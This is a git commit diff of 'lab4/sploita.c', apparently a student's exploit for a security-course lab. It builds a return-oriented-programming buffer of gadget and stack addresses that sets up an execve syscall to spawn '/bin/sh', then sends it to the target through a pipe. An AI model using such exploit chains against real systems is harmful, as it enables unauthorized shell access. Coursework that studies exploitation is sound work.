f70006c954ea039e5d4e3c0b37e25c0d5cb1993f
ishanphadke <44324805+ishanphadke@users.noreply.github.com>
2020-10-23 20:54:21 -0500

    Testing rest args

--- lab4/sploita.c
+++ lab4/sploita.c
@@ -7,11 +7,18 @@
 
 int main(void)
 {
-  char bufr[146];
+  char bufr[155];
+  // bufr address = bfbf57e5
+  char null_arg_addr[] = "\x94\x58\xbf\xbf";
+  char shell_addr[] = "\x98\x58\xbf\xbf";
+  char prev_addr[] = "\x8c\x58\xbf\xbf";
+
   char trap[] = "\xe5\xb6\xa9\xbb";
   char xor_eax[] = "\xc2\xb3\xa9\xbb";
   char pop_eax[] = "\xe1\xa0\xb9\xbb";
+  char xor_edx[] = "\xd4\xbe\xb3\xbb";
   char pop_edx[] = "\x1b\xdc\xb9\xbb";
+  char pop_ecx[] = "\x22\xa4\xba\xbb";
   char add_dl_al[] = "\x07\x46\xbb\xbb";
 
   char exec_arg[] = "\x3b\x01\x01\x01";
@@ -28,7 +35,22 @@ int main(void)
   // clear eax
   strcpy(bufr + 139, xor_eax);  
   // add last 8 bits of edx to eax
-  strcpy(bufr + 143, add_dl_al);  
+  strcpy(bufr + 143, add_dl_al);// eax now holds 0x3b (59)
+  // clear edx 
+  strcpy(bufr + 147, xor_edx);  
+  // pop null args address into ecx
+  strcpy(bufr + 151, pop_ecx);
+  strcpy(bufr + 155, null_arg_addr);
+  // trap into kernel
+  strcpy(bufr + 159, trap);
+  // leave 4 bytes for the ret call of trap
+  // address of "/bin/sh"
+  strcpy(bufr + 167, shell_addr);
+  // address of prev arg
+  strcpy(bufr + 171, prev_addr);
+  // leave 4 bytes for null arg at bufr + 175
+  // location of "/bin/sh" bufr + 179
+  strcpy(bufr + 179, "/bin/sh");
 
   writecmd(PIPEPATH, bufr);
   
